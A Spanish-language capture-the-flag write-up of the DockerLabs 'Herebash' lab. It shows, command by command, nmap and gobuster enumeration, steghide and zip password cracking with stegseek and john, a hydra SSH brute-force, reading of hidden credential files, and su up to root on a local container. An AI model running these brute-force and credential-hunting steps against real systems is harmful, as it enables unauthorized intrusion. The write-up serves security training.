---
title: DockerLabs - Herebash
summary: "Write-up del laboratorio Herebash de DockerLabs"
author: elcybercurioso
date: 2026-02-03 12:54:00
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_herebash"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ nmap -sCV -p22,80 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:16:59:41:d2:f1:d4:cf:20:cc:ad:e0:f8:8c:ed:a2 (ECDSA)
|_  256 72:9b:5b:79:74:e8:18:d6:0b:31:2e:99:00:01:b5:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## análisis

Comenzamos revisando la página principal del puerto 80 de la máquina, donde vemos que hay desplegado un servidor Apache:

![Desktop View](/20260122204341.webp){: width="972" height="589" .shadow}

Mientras analizamos la página, ejecutaremos **gobuster** y lo dejaremos buscando por fuerza bruta recursos en el servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/scripts              (Status: 301) [Size: 310] [--> http://172.17.0.2/scripts/]
/index.html           (Status: 200) [Size: 10733]
/spongebob            (Status: 301) [Size: 312] [--> http://172.17.0.2/spongebob/]
/revolt               (Status: 301) [Size: 309] [--> http://172.17.0.2/revolt/]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

En la página inicial, encontramos una URL que nos redirige al recurso `/spongebob/spongebob.html`:

![Desktop View](/20260122205007.webp){: width="972" height="589" .shadow}

Aquí vemos que nos dan una pista de hacia donde debemos enfocar nuestra búsqueda:

![Desktop View](/20260122204911.webp){: width="972" height="589" .shadow}

Si vamos al recurso `/spongebob` (que es la carpeta donde se aloja la página anterior) encontramos que podemos acceder, y nos lista una serie de ficheros y una carpeta:

![Desktop View](/20260122204620.webp){: width="972" height="589" .shadow}

Seguimos revisando los recursos que encontramos con **gobuster**, ya que la pista que dan todavía no encaja con nada de lo que hemos encontrado hasta ahora.

### /scripts

Si accedemos al recurso `/scripts` vemos que se listan una serie de ficheros y directorios:

![Desktop View](/20260128132202.webp){: width="972" height="589" .shadow}

### put.php

Con la pista que nos dieron antes, podemos probar a ver que métodos acepta el script `put.php`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ curl -s -X GET "http://172.17.0.2/scripts/put.php"                                  
Método no permitido
```

Viendo que no acepta el método `GET`, probamos con el método `POST`, pero la respuesta es la misma:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ curl -s -X POST "http://172.17.0.2/scripts/put.php"                                  
Método no permitido
```

La pista nos hablaba sobre un nombre y un método, por lo que probamos a ver si el script acepta el método `PUT`, y vemos que en este caso nos devuelve una cadena:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ curl -s -X PUT "http://172.17.0.2/scripts/put.php"
spongebob
```

Seguimos revisando el recurso `/upload`, ya que la cadena que nos devuelve no nos aporta ahora mismo mucha más información.

### /upload

Dentro de la carpeta `/upload` vemos una imagen:

![Desktop View](/20260128132847.webp){: width="972" height="589" .shadow}

Nos la bajamos para analizarla:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ wget http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg                                                     
--XXXX-XX-XX XX:XX:XX--  http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg
Connecting to 172.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 118308 (116K) [image/jpeg]
Saving to: ‘ohnorecallwin.jpg’

ohnorecallwin.jpg                                    100%[====================================================================================================================>] 115.54K  --.-KB/s    in 0s      

XXXX-XX-XX XX:XX:XX (309 MB/s) - ‘ohnorecallwin.jpg’ saved [118308/118308]


┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ ls
cmd.php  ohnorecallwin.jpg
```

Al abrirla con **steghide**, vemos que nos pide una clave:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ steghide info ohnorecallwin.jpg              
"ohnorecallwin.jpg":
  format: jpeg
  capacity: 5.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Usaremos **steghide** para buscar por fuerza bruta la clave para extraer lo que está oculto dentro de la imagen, que tras un tiempo vemos que lo encuentra y nos extrae el fichero, el cual es un comprimido `.zip`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ stegseek --crack ohnorecallwin.jpg -wl /usr/share/seclists/Passwords/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "*********"
[i] Original filename: "seguro.zip".
[i] Extracting to "ohnorecallwin.jpg.out".

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ ls
cmd.php  ohnorecallwin.jpg  ohnorecallwin.jpg.out
```

Por ello, le cambiamos el nombre para poder identificarlo más fácilmente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ mv ohnorecallwin.jpg.out seguro.zip
```

Revisamos cual es su contenido con la utilidad **7z**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ 7z l seguro.zip                                 

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_GB.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 211 bytes (1 KiB)

Listing archive: seguro.zip

--
Path = seguro.zip
Type = zip
Physical Size = 211

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-06-13 19:28:13 .....           11           23  secreto.txt
------------------- ----- ------------ ------------  ------------------------
2024-06-13 19:28:13                 11           23  1 files
```

Al tratar de descomprimirlo, vemos que nuevamente nos piden una contraseña (no es la que encontramos con **stegseek**), por lo que usaremos **zip2john** para generar un hash:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ zip2john seguro.zip > hash
ver 1.0 efh 5455 efh 7875 seguro.zip/secreto.txt PKZIP Encr: 2b chk, TS_chk, cmplen=23, decmplen=11, crc=3DF4DA21 ts=8387 cs=8387 type=0
```

Posteriormente se lo pasaremos a **john** para tratar de obtener la contraseña por fuerza bruta, que tras un breve periodo de tiempo, la encuentra:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ john -w=/usr/share/seclists/Passwords/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
*********        (seguro.zip/secreto.txt)
Session completed. 
```

Teniendo la contraseña, descomprimimos el contenido:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ 7z x seguro.zip                                       

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_GB.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 211 bytes (1 KiB)

Extracting archive: seguro.zip
--
Path = seguro.zip
Type = zip
Physical Size = 211

Enter password (will not be echoed):
Everything is Ok

Size:       11
Compressed: 211
```

Lo que obtenemos es un fichero de texto (`secreto.txt`), el cual contiene una cadena de texto:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ cat secreto.txt 
**********
```

## acceso inicial (rosa)

Dado que no sabemos para que se usa esta cadena, dejaremos en segundo plano **hydra** intentando averiguar por fuerza bruta si se trata de la contraseña de algún usuario por SSH en la máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -p ********** ssh://172.17.0.2 -t 64 -I
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10177 login tries (l:10177/p:1), ~160 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 488.00 tries/min, 488 tries in 00:01h, 9733 to do in 00:20h, 20 active
[STATUS] 422.00 tries/min, 1266 tries in 00:03h, 8955 to do in 00:22h, 20 active
[STATUS] 385.43 tries/min, 2698 tries in 00:07h, 7529 to do in 00:20h, 14 active
[STATUS] 321.75 tries/min, 3861 tries in 00:12h, 6369 to do in 00:20h, 11 active
[STATUS] 290.88 tries/min, 4945 tries in 00:17h, 5285 to do in 00:19h, 11 active
[STATUS] 274.27 tries/min, 6034 tries in 00:22h, 4196 to do in 00:16h, 11 active
[STATUS] 263.41 tries/min, 7112 tries in 00:27h, 3118 to do in 00:12h, 11 active
[STATUS] 256.19 tries/min, 8198 tries in 00:32h, 2032 to do in 00:08h, 11 active
[22][ssh] host: 172.17.0.2   login: rosa   password: **********
[STATUS] 249.81 tries/min, 9243 tries in 00:37h, 987 to do in 00:04h, 11 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

Finalmente encontramos que la contraseña pertenece a la usuaria `rosa`, por lo que nos conectamos por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Herebash]
└─$ ssh rosa@172.17.0.2                                                             
rosa@172.17.0.2`s password: 
rosa@1ff04139c4f0:~$ whoami
rosa
rosa@1ff04139c4f0:~$ hostname -I
172.17.0.2
```

Listamos los usuarios del sistema que tengan asignada una consola en el fichero `/etc/passwd`:

```bash
rosa@1ff04139c4f0:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
pedro:x:1002:1002:,,,:/home/pedro:/bin/bash
juan:x:1003:1003:,,,:/home/juan:/bin/bash
```

## movimiento lateral (pedro)

En el directorio personal de la usuaria `rosa` encontramos el directorio `-`:

```bash
rosa@1ff04139c4f0:~$ ls -la
total 32
drwxrwxr-x 69 rosa rosa 4096 Jun 17  2024 -
drwxr-x---  1 rosa rosa 4096 Jun 21  2024 .
drwxr-xr-x  1 root root 4096 Jun 17  2024 ..
-rw-r--r--  1 rosa rosa  220 Jun 17  2024 .bash_logout
-rw-r--r--  1 rosa rosa 3771 Jun 17  2024 .bashrc
drwx------  2 rosa rosa 4096 Jun 21  2024 .cache
drwxrwxr-x  3 rosa rosa 4096 Jun 17  2024 .local
-rw-r--r--  1 rosa rosa  807 Jun 17  2024 .profile
```

Dentro encontramos un gran número de carpetas, y un script:

```bash
rosa@1ff04139c4f0:~$ ls -la -
total 280
drwxrwxr-x 69 rosa rosa 4096 Jun 17  2024 .
drwxr-x---  1 rosa rosa 4096 Jun 21  2024 ..
drwxrwxr-x  2 rosa rosa 4096 Jun 17  2024 buscaelpass1
drwxrwxr-x  2 rosa rosa 4096 Jun 17  2024 buscaelpass10
drwxrwxr-x  2 rosa rosa 4096 Jun 17  2024 buscaelpass11
...
drwxrwxr-x  2 rosa rosa 4096 Jun 17  2024 buscaelpass7
drwxrwxr-x  2 rosa rosa 4096 Jun 17  2024 buscaelpass8
drwxrwxr-x  2 rosa rosa 4096 Jun 17  2024 buscaelpass9
-rwxrwxr-x  1 rosa rosa  432 Jun 17  2024 creararch.sh
```

El script se encarga de crear una gran cantidad de ficheros y guardarlos en las subcarpetas de la carpeta `-`:

```bash
rosa@1ff04139c4f0:~$ cat './-/creararch.sh'
#!/bin/bash

# Buscamos directorios que empiezan con "busca"
for directorio in busca*; do
        # Comprobamos si el directorio existe
        if [ -d "$directorio" ]; then
                # Crearmos 50 archivos y les metemos el contenido xx
                for i in {1..50}; do
                        touch "$directorio/archivo$i" && echo "xxxxxx:xxxxxx" >$directorio/archivo$i
                done
                echo "Se crearon 50 archivos en $directorio"
        else
                echo "El directorio $directorio no existe"
        fi
done
```

Como sabemos el contenido que van a tener todos los ficheros que modifica el script, podemos obviarlos, y así obtener solo el contenido de los ficheros que no tengan dicho contenido, para que de esta manera obtener finalmente la contraseña del usuario `pedro`:

```bash
rosa@1ff04139c4f0:~/-$ find . -type f | xargs cat | grep -v "xxxxxx:xxxxxx"
pedro:******
#!/bin/bash

# Buscamos directorios que empiezan con "busca"
for directorio in busca*; do
        # Comprobamos si el directorio existe
        if [ -d "$directorio" ]; then
                # Crearmos 50 archivos y les metemos el contenido xx
                for i in {1..50}; do
                done
                echo "Se crearon 50 archivos en $directorio"
        else
                echo "El directorio $directorio no existe"
        fi
done
```

Probamos a ver si la contraseña es correcta, y vemos que así es:

```bash
rosa@1ff04139c4f0:~/-$ su pedro
Password: 
pedro@1ff04139c4f0:/home/rosa/-$ whoami
pedro
```

## movimiento lateral (juan)

Buscamos los ficheros y carpetas que pertenezcan al usuario `pedro` dentro del sistema:

```bash
pedro@1ff04139c4f0:/home/rosa/-$ find / -user pedro 2>/dev/null | grep -v "/proc"
/home/pedro
/home/pedro/...
/home/pedro/.../.misecreto
/home/pedro/.local
/home/pedro/.local/share
/home/pedro/.local/share/nano
/home/pedro/.profile
/home/pedro/.bash_logout
/home/pedro/.bashrc
/home/pedro/.cache
/home/pedro/.cache/motd.legal-displayed
/var/mail/.pass_juan
```

Uno de ellos es el fichero `/home/pedro/.../.misecreto` en el cual nos indican que la contraseña del usuario `juan` se encuentra dentro de algún fichero del sistema:

```bash
pedro@1ff04139c4f0:/home/rosa/-$ cat /home/pedro/.../.misecreto
Consegui el pass de juan y lo tengo escondido en algun lugar del sistema fuera de mi home.
```

Sin embargo, la búsqueda con `find` ya nos descubre cual es dicho fichero, por lo que procedemos a leer su contenido:

```bash
pedro@1ff04139c4f0:/home/rosa/-$ cat /var/mail/.pass_juan
****************
```

El formato que tiene parece ser Base64, por lo que procedemos a decodificarlo y probamos a conectarnos como el usuario `juan`. Sin embargo, vemos que la contraseña no es correcta:

```bash
pedro@1ff04139c4f0:/home/rosa/-$ echo "****************" | base64 -d
***********
pedro@1ff04139c4f0:/home/rosa/-$ su juan
Password: 
su: Authentication failure
```

Otra posibilidad es que la contraseña sea la cadena codificada en Base64, por lo que probamos con la cadena codificada, y vemos que accedemos correctamente como el usuario `juan`:

```bash
pedro@1ff04139c4f0:/home/rosa/-$ su juan
Password: 
juan@1ff04139c4f0:/home/rosa/-$ whoami
juan
```

## escalada de privilegios (root)

En el directorio personal del usuario `juan` encontramos un fichero oculto llamado `.ordenes_nuevas`:

```bash
juan@1ff04139c4f0:~$ ls -la
total 36
drwxr-x--- 1 juan juan 4096 XXX XX XX:XX .
drwxr-xr-x 1 root root 4096 Jun 17  2024 ..
-rw------- 1 juan juan   92 XXX XX XX:XX .bash_history
-rw-r--r-- 1 juan juan  220 Jun 17  2024 .bash_logout
-rw-r--r-- 1 juan juan 3791 Jun 17  2024 .bashrc
drwxrwxr-x 3 juan juan 4096 Jun 17  2024 .local
-rw-rw-r-- 1 juan juan  112 Jun 17  2024 .ordenes_nuevas
-rw-r--r-- 1 juan juan  807 Jun 17  2024 .profile
```

Dentro nos indican que la contraseña de otro usuario (suponemos que está hablando del usuario `root`) se encuentra en algún sitio a mano:

```bash
juan@1ff04139c4f0:~$ cat .ordenes_nuevas
Hola soy tu patron y me canse y me fui a casa te dejo mi pass en un lugar a mano consiguelo y acaba el trabajo.
```

Revisando los fichero del directorio personal del usuario `juan` encontramos que el fichero `.bashrc` hay un alias llamado `pass` con una cadena:

```bash
juan@1ff04139c4f0:~$ cat .bashrc | grep pass
alias pass='******'
```

Probamos a ver si esa es la contraseña del usuario `root`, y vemos que así es:

```bash
juan@1ff04139c4f0:~$ su root
Password: 
root@1ff04139c4f0:/home/juan# whoami
root
```

Y de esta manera habremos ganado acceso privilegiado en la máquina **Herebash**!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>